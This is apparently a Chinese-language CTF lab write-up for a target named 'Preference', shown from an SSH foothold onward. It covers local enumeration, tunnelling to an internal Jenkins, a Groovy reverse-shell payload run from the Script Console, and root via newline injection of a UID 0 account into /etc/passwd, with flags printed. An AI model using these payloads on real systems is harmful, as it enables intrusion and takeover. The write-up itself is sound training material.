__      _____| | ___ ___  _ __ ___   ___
\ \ /\ / / _ \ |/ __/ _ \| '_ ` _ \ / _ \
 \ V  V /  __/ | (_| (_) | | | | | |  __/
  \_/\_/ \___|_|\___\___/|_| |_| |_|\___|

gaoyan8764@Preference:~$ id
uid=1000(gaoyan8764) gid=1000(gaoyan8764) groups=1000(gaoyan8764)
```

读取 user flag：

```bash
gaoyan8764@Preference:~$ cat /home/gaoyan8764/user.txt
flag{user-6380a935b0dc8e88865aba0c0524b9b5}
```

---

## 进入系统后的信息收集

先看 sudo 权限：

```bash
gaoyan8764@Preference:/home$ sudo -l
[sudo] password for gaoyan8764:
Sorry, user gaoyan8764 may not run sudo on Preference.
```

没有 sudo。

看系统用户：

```bash
gaoyan8764@Preference:/home$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/mail:/sbin/nologin
news:x:9:13:news:/usr/lib/news:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
ftp:x:21:21::/var/lib/ftp:/sbin/nologin
sshd:x:22:22:sshd:/dev/null:/sbin/nologin
games:x:35:35:games:/usr/games:/sbin/nologin
ntp:x:123:123:NTP:/var/empty:/sbin/nologin
guest:x:405:100:guest:/dev/null:/sbin/nologin
nobody:x:65534:65534:nobody:/:/sbin/nologin
klogd:x:100:101:klogd:/dev/null:/sbin/nologin
apache:x:104:106:apache:/var/www:/sbin/nologin
gaoyan8764:x:1000:1000::/home/gaoyan8764:/bin/bash
jenkins:x:1001:1001::/var/lib/jenkins:/bin/bash
```

这里有一个很显眼的本地用户：

```text
jenkins
```

再看进程：

```bash
gaoyan8764@Preference:/tmp$ ps -ef
PID   USER     TIME  COMMAND
1 root      0:00 /sbin/init
2400 root      0:00 /sbin/udhcpc -b -R -p /var/run/udhcpc.eth0.pid -i eth0 -x hostname:Preference
2485 root      0:00 /sbin/syslogd -t -n
2512 root      0:00 /sbin/acpid -f
2538 root      0:00 /usr/sbin/crond -c /etc/crontabs -f
2564 root      3:48 /usr/bin/python3 /opt/gateway/app.py
2590 jenkins   0:10 /usr/bin/java -Djava.awt.headless=true -jar /var/lib/jenkins/jenkins.war --httpPort=8080 --httpListenAddress=127.0.0.1 --webroot=/var/lib/jenkins/.jenkins/war
2616 ntp       0:00 /usr/sbin/ntpd -N -p pool.ntp.org -n
```

这里可以明确确认：

```text
Jenkins 正在运行
端口绑定在 127.0.0.1:8080
```

也就是说，外部 nmap 扫不到 8080，但在本机内部是能访问到的。

---

## Jenkins 横向

前面在敏感信息泄露里已经拿到了 3 组 Jenkins 管理员密码：

```text
Jenkins6530#Admin
Jenkins7920#Admin
Jenkins8038#Admin
```

而本地又明确存在 `jenkins` 用户和 Jenkins 进程，所以这条线必须继续跟。

先做本地转发，把靶机上的 127.0.0.1:8080 转到 Kali 本地：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ ssh -L 8088:127.0.0.1:8080 gaoyan8764@192.168.205.217
```

保持这个 SSH 会话不要关，再在 Kali 新开一个终端确认 Jenkins 可访问：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl -si http://127.0.0.1:8088/login | head
HTTP/1.1 200 OK
Date: Tue, 10 Jun 2026 00:11:59 GMT
X-Content-Type-Options: nosniff
X-Hudson: 1.395
X-Jenkins: 2.535
X-Jenkins-Session: 34fd41f5
X-Frame-Options: sameorigin
Content-Type: text/html;charset=UTF-8
```

说明本地转发成功。

然后浏览器访问：

```text
http://127.0.0.1:8088
```

尝试登录，最终有效凭据是：

```text
用户名: jenkins
密码: Jenkins6530#Admin
```

成功进入 Jenkins 后，来到：

```text
Manage Jenkins -> Script Console
```

这个功能非常关键，因为它允许管理员直接执行 Groovy 代码。

---

## Jenkins Script Console 拿 shell

先验证一下能不能执行命令：

```groovy
println(["bash","-c","id"].execute().text)
```

返回：

```text
uid=1001(jenkins) gid=1001(jenkins) groups=1001(jenkins),82(www-data)
```

说明已经可以以 `jenkins` 用户执行系统命令。

接下来直接反弹一个 shell 到 Kali。

Kali 先监听：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nc -lvnp 8888
```

然后在 Script Console 里执行：

```groovy
String host="192.168.205.128";int port=8888;String cmd="/bin/sh";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try{p.exitValue();break;}catch(Exception e){}};p.destroy();s.close();
```

监听端收到连接后，确认身份：

```bash
Preference:/$ id
uid=1001(jenkins) gid=1001(jenkins) groups=82(www-data),1001(jenkins)
```

现在就完成了：

```text
gaoyan8764 -> Jenkins 管理员 -> jenkins 用户 shell
```

---

## Jenkins 用户提权

先看 `jenkins` 的 sudo：

```bash
Preference:/$ sudo -l
Matching Defaults entries for jenkins on Preference:
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

Runas and Command-specific defaults for jenkins:
    Defaults!/usr/sbin/visudo env_keep+="SUDO_EDITOR EDITOR VISUAL"

User jenkins may run the following commands on Preference:
    (ALL) NOPASSWD: /usr/local/bin/edit_passwd
```

这里直接给出了提权入口：

```text
jenkins 可以无密码 sudo 执行 /usr/local/bin/edit_passwd
```

先看当前 `/etc/passwd` 里 jenkins 的记录：

```bash
Preference:/$ grep jenkins /etc/passwd
jenkins:x:1001:1001::/var/lib/jenkins:/bin/bash
```

测试一下这个脚本到底做什么：

```bash
Preference:/$ sudo /usr/local/bin/edit_passwd jenkins "aaa"
Editing GECOS field for user: jenkins (UID: 1001)
Successfully updated GECOS field for user: jenkins
```

再看 passwd：

```bash
Preference:/$ grep jenkins /etc/passwd
jenkins:x:1001:1001:aaa:/var/lib/jenkins:/bin/bash
```

说明：

```text
这个脚本会修改指定用户在 /etc/passwd 中的 GECOS 字段
```

也就是第 5 字段。

接下来测试它是否过滤特殊字符。先试冒号：

```bash
Preference:/$ sudo /usr/local/bin/edit_passwd jenkins "x:0:0:pwn:/root:/bin/sh"
Editing GECOS field for user: jenkins (UID: 1001)
Successfully updated GECOS field for user: jenkins
```

结果：

```bash
Preference:/$ grep jenkins /etc/passwd
jenkins:x:1001:1001:x:0:0:pwn:/root:/bin/sh:/var/lib/jenkins:/bin/bash
```

说明输入内容被原样写进了 `/etc/passwd`，没有做任何过滤。

那就可以继续尝试更危险的换行注入。

---

## /etc/passwd 换行注入

一开始可以试最简单的换行插入一个 UID 0 账号，但空密码账号不一定总能稳定 `su` 成功，受 PAM 配置影响比较大。所以更稳的做法是：

```text
直接插入一个带已知密码哈希的 UID 0 root 用户
```

这里构造的新用户信息：

```text
用户名: b
密码哈希: $1$AydoDDh4$tEky6m30.0nY3HZ8FgoGI0
UID: 0
GID: 0
HOME: /root
SHELL: /bin/bash
```

执行注入：

```bash
Preference:/$ sudo /usr/local/bin/edit_passwd jenkins $':/var/lib/jenkins:/bin/bash\nb:$1$AydoDDh4$tEky6m30.0nY3HZ8FgoGI0:0:0::/root:/bin/bash\n#'
Editing GECOS field for user: jenkins (UID: 1001)
Successfully updated GECOS field for user: jenkins
```

这里传进去的是一个多行字符串，效果是：

1. 先把原 jenkins 行进行恢复，防止等会彻底死掉
2. 中间插入一整行新的 root 用户 `b`
3. 再将原本的 jenkins 后半部分进行注释

注入之后看 `/etc/passwd`：

```bash
Preference:/$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/mail:/sbin/nologin
news:x:9:13:news:/usr/lib/news:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
ftp:x:21:21::/var/lib/ftp:/sbin/nologin
sshd:x:22:22:sshd:/dev/null:/sbin/nologin
games:x:35:35:games:/usr/games:/sbin/nologin
ntp:x:123:123:NTP:/var/empty:/sbin/nologin
guest:x:405:100:guest:/dev/null:/sbin/nologin
nobody:x:65534:65534:nobody:/:/sbin/nologin
klogd:x:100:101:klogd:/dev/null:/sbin/nologin
apache:x:104:106:apache:/var/www:/sbin/nologin
gaoyan8764:x:1000:1000::/home/gaoyan8764:/bin/bash
jenkins:x:1001:1001::/var/lib/jenkins:/bin/bash
b:$1$AydoDDh4$tEky6m30.0nY3HZ8FgoGI0:0:0::/root:/bin/bash
#:/var/lib/jenkins:/bin/bash
```

可以看到，账号 `b` 已经被成功插进去，而且是：

```text
UID 0
GID 0
shell /bin/bash
```

这就已经足够了。

---

## 切换 root

直接切换用户：

```bash
Preference:/$ su b
Password:abcdefg
```

输入与该哈希对应的密码后，成功拿到 root：

```bash
Preference:/# id
uid=0(root) gid=0(root) groups=0(root)
```

---

## 读取 flag

最后读取 user 和 root flag：

```bash
Preference:/# cat /root/root.txt /home/gaoyan8764/user.txt
flag{root-f528c6318cb57c8f56f8b9ebf9a10b56}
flag{user-6380a935b0dc8e88865aba0c0524b9b5}
```